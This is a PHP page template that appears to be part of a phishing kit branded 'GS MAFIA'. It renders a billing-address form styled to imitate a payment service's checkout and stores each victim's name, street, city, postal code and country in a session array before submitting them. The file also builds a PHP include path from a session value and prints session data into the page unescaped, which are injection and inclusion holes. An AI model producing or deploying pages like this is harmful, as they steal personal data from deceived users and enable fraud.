<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
?>
<div class="StickyBody full-height">
<div class="body-content">
<div id="gs_load">
<div id="gs_loading"></div>
<div id="gs_overlay"></div>
</div>
<div>
<div class="row gutter-10 "><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_fname" onblur="gs_verifinput(0);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="<?php echo $_SESSION['gs_billarray']['gs_fname'] ?>" id="gs_fname" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="city"><?php echo $gs_string14 ?></label></div></div></div><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_lname" onblur="gs_verifinput(1);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="<?php echo $_SESSION['gs_billarray']['gs_lname'] ?>" id="gs_lname" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="postalCode"><?php echo $gs_string15 ?></label>
</div></div></div></div>
<div id="address-suggest-field" class="AddressSuggestField"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_street1" onblur="gs_verifinput(2);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" id="gs_street1" value="<?php  echo $_SESSION['gs_billarray']['gs_street1'] ?>" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="street1"><?php echo $gs_string16 ?></label>
</div></div></div><div class="TextField form-field"></div></div><div class="row gutter-10 "><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_city" onblur="gs_verifinput(3);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="<?php  echo $_SESSION['gs_billarray']['gs_city'] ?>" id="gs_city" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="city"><?php echo $gs_string17 ?></label>
</div></div></div><div class="col-xs-6"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_postalCode" onblur="gs_verifinput(4);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="<?php  echo $_SESSION['gs_billarray']['gs_postalCode'] ?>" id="gs_postalCode" maxlength="10" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="postalCode"><?php echo $gs_string18 ?></label>
</div></div></div>
</div>
<div id="address-suggest-field" class="AddressSuggestField"><div class="TextField form-field"><div class="inputField textInput"><input type="text" name="gs_country" onblur="gs_verifinput(2);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" id="gs_country" value="<?php  echo $_SESSION['gs_billarray']['gs_country'] ?>" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false"><label class="input-has-value" for="gs_country"><?php echo $gs_string35 ?></label>
</div></div></div>
</div>
</div>
<div class="StickyFooter">
<div class="sticky-footer-container">
	<div class="sticky-footer-fade">
	</div>
	<div class="sticky-footer-body">
		<div class="body-content">
			<div id="action-buttons" class="buttons">
				<button class="CAPE-Button btn full " onclick="gs_processeditbill();" type="button" id="billingInfoContinueBtn">
					<span><?php echo $gs_string19 ?></span>
					</button>
				</div>
			</div>
		</div>
	</div>
</div>